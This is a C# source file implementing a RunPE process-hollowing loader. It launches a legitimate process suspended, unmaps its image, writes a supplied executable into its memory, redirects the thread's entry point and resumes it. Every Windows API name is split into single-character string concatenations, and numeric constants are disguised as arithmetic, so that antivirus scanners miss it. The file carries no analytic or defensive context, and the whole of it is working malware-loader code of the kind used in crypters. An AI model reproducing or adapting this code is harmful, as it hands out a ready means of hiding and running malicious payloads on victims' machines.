
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security;
    internal static class RunPe2
{

    /* You are not meant to understand this */ 

    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "C" + "r" + "e" + "a" + "t" + "e" + "P" + "r" + "o" + "c" + "e" + "s" + "s", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
    private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "G" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
    private static extern bool GetThreadContext(IntPtr thread, int[] context);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "o" + "w" + "6" + "4" + "G" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
    private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "S" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
    private static extern bool SetThreadContext(IntPtr thread, int[] context);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "o" + "w" + "6" + "4" + "S" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
    private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "R" + "e" + "a" + "d" + "P" + "r" + "o" + "c" + "e" + "s" + "s" + "M" + "e" + "m" + "o" + "r" + "y"), SuppressUnmanagedCodeSecurity]
    private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "r" + "i" + "t" + "e" + "P" + "r" + "o" + "c" + "e" + "s" + "s" + "M" + "e" + "m" + "o" + "r" + "y"), SuppressUnmanagedCodeSecurity]
    private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
    [DllImport("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l", EntryPoint = "N" + "t" + "U" + "n" + "m" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n"), SuppressUnmanagedCodeSecurity]
    private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "V" + "i" + "r" + "t" + "u" + "a" + "l" + "A" + "l" + "l" + "o" + "c" + "E" + "x"), SuppressUnmanagedCodeSecurity]
    private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d"), SuppressUnmanagedCodeSecurity]
    private static extern int ResumeThread(IntPtr handle);
    [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
    private struct ProcessInformation
    {
        public readonly IntPtr ProcessHandle;
        public readonly IntPtr ThreadHandle;
        public readonly uint ProcessId;
        private readonly uint ThreadId;
    }
    [StructLayout(LayoutKind.Sequential, Pack = 3 - 2)]
    private struct StartupInformation
    {
        public uint Size;
        private readonly string Reserved1;
        private readonly string Desktop;
        private readonly string Title;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 18 + 18)] private readonly byte[] Misc;
        private readonly IntPtr Reserved2;
        private readonly IntPtr StdInput;
        private readonly IntPtr StdOutput;
        private readonly IntPtr StdError;
    }
    public static bool Run(string path, byte[] data, bool compatible, string cmdline = "")
    {
        for (var I = 1; I <= 5; I++)
            if (HandleRun(path, data, compatible,cmdline)) return true;
        return false;
    }
    private static bool HandleRun(string path, byte[] data, bool compatible, string cmd)
    {
        var readWrite = 0;
        

        var quotedPath = $"\"{path}\" {cmd}";
        var si = new StartupInformation();
        var pi = new ProcessInformation();
        si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
        try
        {
            if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 2 + 2, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
            var fileAddress = BitConverter.ToInt32(data, 120 / 2);
            var imageBase = BitConverter.ToInt32(data, fileAddress + 26 + 26);
            var context = new int[179];
            context[0] = 32769 + 32769;
            if (IntPtr.Size == 8 / 2)
            { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
            else
            { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
            var ebx = context[41];
            var baseAddress = 1 - 1;
            if (!ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, ref baseAddress, 2 + 2, ref readWrite)) throw new Exception();
            if (imageBase == baseAddress)
                if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 1 - 1) throw new Exception();
            var sizeOfImage = BitConverter.ToInt32(data, fileAddress + 160 / 2);
            var sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 42 + 42);
            var allowOverride = false;
            var newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32);
            if (!compatible && newImageBase == 1 - 1)
            {
                allowOverride = true;
                newImageBase = VirtualAllocEx(pi.ProcessHandle, 1 - 1, sizeOfImage, 6144 * 2, 32 + 32);
            }
            if (newImageBase == 0) throw new Exception();
            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite)) throw new Exception();
            var sectionOffset = fileAddress + 124 * 2;
            var numberOfSections = BitConverter.ToInt16(data, fileAddress + 3 + 3);
            for (var I = 1 - 1; I < numberOfSections; I++)
            {
                var virtualAddress = BitConverter.ToInt32(data, sectionOffset + 6 + 6);
                var sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 8 + 8);
                var pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 40 / 2);
                if (sizeOfRawData != 1 - 1)
                {
                    var sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length);
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                }
                sectionOffset += 120 / 3;
            }
            var pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, ebx + 16 / 2, pointerData, 2 * 2, ref readWrite)) throw new Exception();
            var addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 80 / 2);
            if (allowOverride) newImageBase = imageBase;
            context[22 + 22] = newImageBase + addressOfEntryPoint;

            if (IntPtr.Size == 2 + 2)
            {
                if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
            }
            else
            {
                if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
            }
            if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
        }
        catch
        {
            var p = Process.GetProcessById(Convert.ToInt32(pi.ProcessId));
            p.Kill();
            return false;
        }
        return true;
    }
}
